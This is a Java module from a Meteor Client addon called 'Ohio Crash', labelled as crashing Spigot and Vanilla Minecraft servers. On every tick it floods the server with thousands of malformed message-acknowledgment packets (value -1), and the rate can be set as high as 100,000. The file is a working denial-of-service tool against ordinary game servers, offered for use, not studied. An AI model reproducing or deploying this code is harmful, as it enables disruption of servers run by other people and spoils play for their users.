package com.x310.clarity.features.crashers.impl;

import com.x310.clarity.Main;
import com.x310.clarity.features.crashers.Crasher;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.*;

public class OhioCrash extends Crasher {
    public OhioCrash() {
        super(Main.CRASH_GROUP, "Ohio Crash", "Crashes Spigot & Vanilla Servers");
    }

    private final Setting<Integer> buffer = sg.add(new IntSetting.Builder()
        .name("Amount")
        .description("Amount of packets to send every tick")
        .defaultValue(3000)
        .min(1)
        .max(100000)
        .sliderMax(100000)
        .build()
    );

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;
        ClientPlayNetworkHandler handler = mc.getNetworkHandler();

        for (int i = 0; i < buffer.get(); i++) {
            ItemStack ohio = new ItemStack(Items.DIAMOND, Integer.MAX_VALUE);
            handler.sendPacket(new MessageAcknowledgmentC2SPacket(-1));
        }
    }

}
